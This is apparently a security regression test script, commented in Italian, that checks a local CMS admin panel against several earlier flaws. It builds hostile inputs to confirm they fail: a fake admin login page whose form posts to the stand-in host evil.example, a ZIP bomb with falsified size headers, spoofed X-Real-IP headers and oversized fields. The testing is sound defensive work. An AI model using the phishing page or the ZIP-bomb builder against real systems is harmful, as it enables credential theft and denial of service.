import subprocess, os, io, zipfile, struct, urllib.parse, sqlite3
B = "http://127.0.0.1:8081"; D = "/tmp/v8"; os.chdir(D); fails = 0
def curl(jar, *a, out="/dev/null", w="%{http_code} %{redirect_url}"):
    return subprocess.run(["curl","-s","-b",jar,"-c",jar,"-o",out,"-w",w,*a], capture_output=True, text=True).stdout
def msg(r): return urllib.parse.unquote(r.split("msg=",1)[-1]) if "msg=" in r else r
def ok(c, l):
    global fails; fails += 0 if c else 1; print(("  OK  " if c else "  NO  ") + l)
curl("a.jar","-d","email=admin@x.it&password=password-lunga-123",B+"/admin/login")
curl("a.jar","-X","POST",B+"/admin/rebuild")
curl("a.jar","--form-string","name=Autore","--form-string","email=autore@x.it","--form-string","role=author","--form-string","password=password-lunga-123",B+"/admin/users/0")
curl("s.jar","-H","X-Real-IP: 10.0.0.9","-d","email=autore@x.it&password=password-lunga-123",B+"/admin/login")

print("V1 — un tema non può sostituire le pagine del pannello")
curl("a.jar","-F","action=mkdir","-F","path=themes","-F","name=admin",B+"/admin/files")
open("login.html","w").write('<h1>PWNED</h1><form action="https://evil.example/raccogli">')
curl("a.jar","-F","action=upload","-F","path=themes/admin","-F","files=@login.html",B+"/admin/files")
curl("a.jar","-X","POST",B+"/admin/rebuild")
page = subprocess.run(["curl","-s",B+"/admin/login"],capture_output=True,text=True).stdout
ok("PWNED" not in page and "evil.example" not in page, "la pagina di accesso resta quella del programma")

print("V2 — un articolo non cancella i file caricati dall'amministratore")
curl("a.jar","-F","action=mkdir","-F","path=public","-F","name=documenti",B+"/admin/files")
open("reg.pdf","w").write("regolamento importante")
curl("a.jar","-F","action=upload","-F","path=public/documenti","-F","files=@reg.pdf",B+"/admin/files")
r = curl("s.jar","--form-string","title=Prova","--form-string","slug=documenti","--form-string","body=<p>x</p>","--form-string","status=draft",B+"/admin/edit/0")
ok(os.path.exists("public/documenti/reg.pdf"), "la cartella dell'amministratore esiste ancora dopo la bozza dell'autore")
# e un redattore che pubblica con quello slug ottiene un altro slug, non sovrascrive
curl("a.jar","-X","POST",B+"/admin/rebuild")
rr = curl("a.jar","--form-string","title=Doc pubblico","--form-string","slug=documenti","--form-string","body=<p>y</p>","--form-string","status=published",B+"/admin/edit/0")
ok(os.path.exists("public/documenti/reg.pdf"), "anche dopo la pubblicazione di un redattore con lo stesso slug il file resta")

print("V3 — lo ZIP che dichiara dimensioni false viene fermato ai byte reali")
buf = io.BytesIO()
with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as z:
    for i in range(14): z.writestr(f"g{i}.bin", b"\0"*30_000_000)
data = bytearray(buf.getvalue())
for sig,off in ((b"PK\x03\x04",22),(b"PK\x01\x02",24)):
    i=0
    while True:
        i=data.find(sig,i)
        if i<0: break
        data[i+off:i+off+4]=struct.pack("<I",1); i+=4
open("bomba.zip","wb").write(data)
curl("a.jar","-F","action=upload","-F","path=public","-F","files=@bomba.zip",B+"/admin/files")
r = curl("a.jar","-F","action=extract","-F","path=public/bomba.zip",B+"/admin/files")
written = sum(os.path.getsize(f"public/{f}") for f in os.listdir("public") if f.startswith("g") and f.endswith(".bin"))
ok(written <= 300*1024*1024 and "supererebbe" in msg(r), f"estrazione fermata: {written//1024//1024} MB scritti, esito: {msg(r)[:60]}")
for f in os.listdir("public"):
    if f.startswith("g") and f.endswith(".bin"): os.remove(f"public/{f}")

print("V7 — campi troppo lunghi rifiutati")
r = curl("s.jar","--form-string","title=Prova","--form-string","description="+("a"*600),"--form-string","body=<p>x</p>","--form-string","status=draft",B+"/admin/edit/0")
ok("troppo lungo" in msg(r), "sommario da 600 caratteri rifiutato: "+msg(r)[:50])
r = curl("a.jar","--form-string","name=Autore","--form-string","email=autore@x.it","--form-string","bio="+("b"*1100),"--form-string","current_password=x",B+"/admin/users/2")
ok("troppo lunga" in msg(r), "biografia da 1100 caratteri rifiutata")

print("V8 — numero di tag limitato e limite di corpo sulle rotte solo-form")
r = curl("s.jar","--form-string","title=Molti tag","--form-string","body=<p>x</p>","--form-string","tags="+",".join(f"t{i}" for i in range(40)),"--form-string","status=draft",B+"/admin/edit/0")
pid = None
import re
m = re.search(r"edit/(\d+)", r)
if m:
    pid = m.group(1)
    db = sqlite3.connect("presstatic.db"); row = db.execute("SELECT tags FROM posts WHERE id=?", (pid,)).fetchone()
    ntag = len([t for t in row[0].split(",") if t.strip()]) if row else 0
    ok(ntag <= 20, f"tag salvati: {ntag} su 40")
open("big.txt","w").write("anthropic_key=" + "x"*200000)
code = subprocess.run(["curl","-s","-o","/dev/null","-w","%{http_code}","-b","a.jar","-H","X-Real-IP:127.0.0.1","-H","Content-Type:application/x-www-form-urlencoded","--data-binary","@big.txt",B+"/admin/integrations"],capture_output=True,text=True).stdout
ok(code in ("413","403"), f"campo enorme sulle integrazioni respinto (HTTP {code})")

print("\nRISULTATO:", "tutto superato" if fails==0 else f"{fails} controlli non superati")
